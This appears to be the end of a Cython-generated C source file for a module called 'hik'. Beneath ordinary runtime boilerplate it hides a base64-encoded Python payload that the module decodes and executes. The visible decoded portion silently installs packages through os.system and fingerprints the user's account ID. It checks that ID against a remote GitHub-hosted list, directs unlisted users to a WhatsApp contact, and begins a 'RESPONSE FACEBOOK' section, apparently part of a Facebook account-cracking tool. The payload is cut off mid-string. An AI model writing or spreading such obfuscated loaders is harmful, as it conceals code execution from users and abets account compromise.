  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__hik
#define __PYX_HAVE_API__hik
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "hik.pyx",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
#define __Pyx_GetModuleGlobalNameUncached(var, name)  {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
}
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'hik' */
#define __Pyx_MODULE_NAME "hik"
extern int __pyx_module_is_main_hik;
int __pyx_module_is_main_hik = 0;

/* Implementation of 'hik' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_base64[] = "base64";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_b64decode[] = "b64decode";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0N[] = "IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCmltcG9ydCBvcw0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBbw5ddIE1vZHVsIHJlcXVlc3RzIGJlbHVtIHRlcmluc3RhbGwhLi4uXG4nKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQ0KDQp0cnk6DQogICAgaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcw0KZXhjZXB0IEltcG9ydEVycm9yOg0KICAgIHByaW50KCdcbiBbw5ddIE1vZHVsIEZ1dHVyZXMgYmVsdW0gdGVyaW5zdGFsbCEuLi5cbicpDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmdXR1cmVzJykNCg0KdHJ5Og0KICAgIGltcG9ydCBiczQNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCiAgICBwcmludCgnXG4gW8OXXSBNb2R1bCBCczQgYmVsdW0gdGVyaW5zdGFsbCEuLi5cbicpDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQ0KDQppbXBvcnQgcmVxdWVzdHMsIG9zLCByZSwgYnM0LCBzeXMsIGpzb24sIHRpbWUsIHJhbmRvbSwgZGF0ZXRpbWUsIHN1YnByb2Nlc3MsIHRocmVhZGluZywgaXRlcnRvb2xzDQpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFlheWFuR2FudGVuZw0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwDQpkZWYgeG9zaG5hdygpOg0KICB1dWlkID0gc3RyKG9zLmdldGV1aWQoKSkgKyBzdHIob3MuZ2V0bG9naW4oKSkNCiAgaWQgPSAiLSIuam9pbih1dWlkKQ0KICBwcmludCgiXHgxYlszNzsxbVlPVVIgSUQgOiAiK2lkKQ0KICB0cnk6DQogICAgaHR0cENhaHQgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9raGFuLXRhbi9kZW1vbi9tYWluL2RlbW9uIikudGV4dA0KICAgIGlmIGlkIGluIGh0dHBDYWh0Og0KICAgICAgcHJpbnQoIlwwMzNbMTs5Mm1ZT1VSIElEIElTIEFDVElWRS4uLiEiKQ0KICAgICAgbXNnID0gc3RyKG9zLmdldGV1aWQoKSkNCiAgICAgIHRpbWUuc2xlZXAoMC4zKQ0KICAgICAgcGFzcw0KICAgIGVsc2U6DQogICAgICBwcmludCgiXHgxYlsxOzkxbUlEIEFDVElWQVRFICh0ZWxlZ3JhbSkgSU5CT1ggIEBLYXJtYTQyOCIpDQogICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd2EubWUvKzIzNDgxMTAwNDQ0MTgnKQ0KICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgc3lzLmV4aXQoKQ0KICBleGNlcHQ6DQogICAgc3lzLmV4aXQoKQ0KICAgIGlmIG5hbWUgPT0gJ19fbWFpbl9fJzoNCiAgICAJcHJpbnQobG9nbykNCiAgICAJeG9zaG5hdygpDQp4b3NobmF3KCkNCmN0ID0gZGF0ZXRpbWUubm93KCkNCm4gPSBjdC5tb250aA0KYnVsYW4gPSBbJ0phbnVhcmknLCAnRmVicnVhcmknLCAnTWFyZXQnLCAnQXByaWwnLCAnTWVpJywgJ0p1bmknLCAnSnVsaScsICdBZ3VzdHVzJywgJ1NlcHRlbWJlcicsICdPa3RvYmVyJywgJ05vdmVtYmVyJywg""J0Rlc2VtYmVyJ10NCnRyeToNCiAgICBpZiBuIDwgMCBvciBuID4gMTI6DQogICAgICAgIGV4aXQoKQ0KICAgIG5UZW1wID0gbiAtIDENCmV4Y2VwdCBWYWx1ZUVycm9yOg0KICAgIGV4aXQoKQ0KDQpjdXJyZW50ID0gZGF0ZXRpbWUubm93KCkNCnRhID0gY3VycmVudC55ZWFyDQpidSA9IGN1cnJlbnQubW9udGgNCmhhID0gY3VycmVudC5kYXkNCm9wID0gYnVsYW5bblRlbXBdDQojIyMgV0FSTkEgUkFORE9NICMjIw0KUCA9ICdceDFiWzE7OTdtJyAjIFBVVElIDQpNID0gJ1x4MWJbMTs5MW0nICMgTUVSQUgNCkggPSAnXHgxYlsxOzkybScgIyBISUpBVQ0KSyA9ICdceDFiWzE7OTNtJyAjIEtVTklORw0KQiA9ICdceDFiWzE7OTRtJyAjIEJJUlUNClUgPSAnXHgxYlsxOzk1bScgIyBVTkdVDQpPID0gJ1x4MWJbMTs5Nm0nICMgQklSVSBNVURBDQpOID0gJ1x4MWJbMG0nICAgICMgV0FSTkEgTUFUSQ0KbXlfY29sb3IgPSBbDQogUCwgTSwgSCwgSywgQiwgVSwgTywgTl0NCndhcm5hID0gcmFuZG9tLmNob2ljZShteV9jb2xvcikNCiMgIE1vY2ggWWF5YW4gSnVhbiBBbHZyZWRvIFhELiAgIw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0+DQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgUkVTUE9OU0UgRkFDRUJPT0sgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KZGF0YSxkYXRhMj17fSx7fQ0KY